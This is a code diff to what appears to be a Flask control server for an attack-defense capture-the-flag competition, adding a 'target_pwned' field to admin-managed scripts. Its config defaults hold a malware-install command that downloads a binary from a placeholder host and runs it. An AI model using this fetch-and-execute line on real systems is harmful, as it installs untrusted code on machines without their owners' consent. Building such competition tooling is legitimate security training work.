@@ -27,7 +27,7 @@ DEFAULT_SUBNET = "172.16.T.B"
 DEFAULT_WHITELISTED_IPS = "127.0.0.1"
 DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
 DEFAULT_MALWARE_PATH = "installer"
-DEFAULT_MALWARE_INSTALL = "curl -o installer http://localhost/i && chmod +x installer && ./installer"
+DEFAULT_MALWARE_INSTALL = "curl -o installer http://CHANGE_ME/i && chmod +x installer && ./installer"
 DEFAULT_STATUS_PWNED_TIMEOUT = "300"
 DEFAULT_STATUS_FLAGS_TIMEOUT = "300"
 DEFAULT_STATUS_INTERVAL = "10"
@@ -80,7 +80,7 @@ def main():
         thread.start()
 
     # Start Flask
-    app.run(port=PORT, debug=DEBUG)
+    app.run(port=PORT, debug=DEBUG, host="0.0.0.0")
 
 
 # <editor-fold desc="Admin Endpoints">
@@ -347,9 +347,10 @@ def admin_scripts_add():
     # Get form data
     service_ip = request.form.get("service_ip")
     path = request.form.get("path")
+    target_pwned = str_to_bool(request.form.get("target_pwned"))
 
     # Add to database
-    db.session.add(Script(service_ip, path))
+    db.session.add(Script(service_ip, path, target_pwned))
     db.session.commit()
 
     # Flash and redirect
@@ -380,11 +381,13 @@ def admin_scripts_update():
     id = request.form.get("id")
     service_ip = request.form.get("service_ip")
     path = request.form.get("path")
+    target_pwned = str_to_bool(request.form.get("target_pwned"))
 
     # Update in database
     script = Script.query.get(id)
     script.service_ip = service_ip
     script.path = path
+    script.target_pwned = target_pwned
     db.session.commit()
 
     # Flash and redirect
@@ -1033,10 +1036,12 @@ class Script(db.Model):
     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
     service = db.relationship(Service, backref=db.backref("scripts", cascade="all, delete-orphan"))
     path = db.Column(db.Text, nullable=False)
+    target_pwned = db.Column(db.Boolean, nullable=False)
 
-    def __init__(self, service_ip, path):
+    def __init__(self, service_ip, path, target_pwned):
         self.service_ip = service_ip
         self.path = path
+        self.target_pwned = target_pwned
 
 
 class FlagRetrieval(db.Model):
